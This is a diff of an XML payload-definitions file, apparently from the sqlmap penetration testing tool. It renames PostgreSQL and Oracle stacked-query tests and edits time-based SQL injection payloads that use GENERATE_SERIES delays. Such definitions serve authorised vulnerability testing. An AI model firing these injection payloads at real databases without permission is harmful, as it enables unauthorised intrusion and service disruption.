@@ -1260,14 +1260,14 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL &lt; 8.2 stacked queries - exists function</title>
+        <title>PostgreSQL &lt; 8.2 stacked queries (EXISTS)</title>
         <stype>4</stype>
         <level>3</level>
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
         <request>
-            <payload>; SELECT 'sqlmap' WHERE exists(SELECT * FROM generate_series(1, 3000000));</payload>
+            <payload>; SELECT [RANDNUM] WHERE EXISTS(SELECT * FROM GENERATE_SERIES(1, 3000000));</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -1280,7 +1280,7 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL &lt; 8.2 stacked queries - Glibc</title>
+        <title>PostgreSQL &lt; 8.2 stacked queries (Glibc)</title>
         <stype>4</stype>
         <level>4</level>
         <risk>0</risk>
@@ -1320,7 +1320,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle stacked queries - BEGIN DBMS_LOCK.SLEEP technique</title>
+        <title>Oracle stacked queries (BEGIN DBMS_LOCK.SLEEP)</title>
         <stype>4</stype>
         <level>3</level>
         <risk>0</risk>
@@ -1339,7 +1339,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle stacked queries - EXEC DBMS_LOCK.SLEEP technique</title>
+        <title>Oracle stacked queries (EXEC DBMS_LOCK.SLEEP)</title>
         <stype>4</stype>
         <level>4</level>
         <risk>0</risk>
@@ -1358,7 +1358,7 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle stacked queries - BEGIN USER_LOCK.SLEEP technique</title>
+        <title>Oracle stacked queries (BEGIN USER_LOCK.SLEEP)</title>
         <stype>4</stype>
         <level>5</level>
         <risk>0</risk>
@@ -1503,7 +1503,7 @@ Formats:
         <clause>1,2,3</clause>
         <where>1</where>
         <request>
-            <payload>AND EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))</payload>
+            <payload>AND EXISTS(SELECT * FROM GENERATE_SERIES(1, 3000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1658,7 +1658,7 @@ Formats:
         <clause>1,2,3</clause>
         <where>2</where>
         <request>
-            <payload>OR EXISTS(SELECT * FROM GENERATE_SERIES(1, 10000000))</payload>
+            <payload>OR EXISTS(SELECT * FROM GENERATE_SERIES(1, 3000000))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
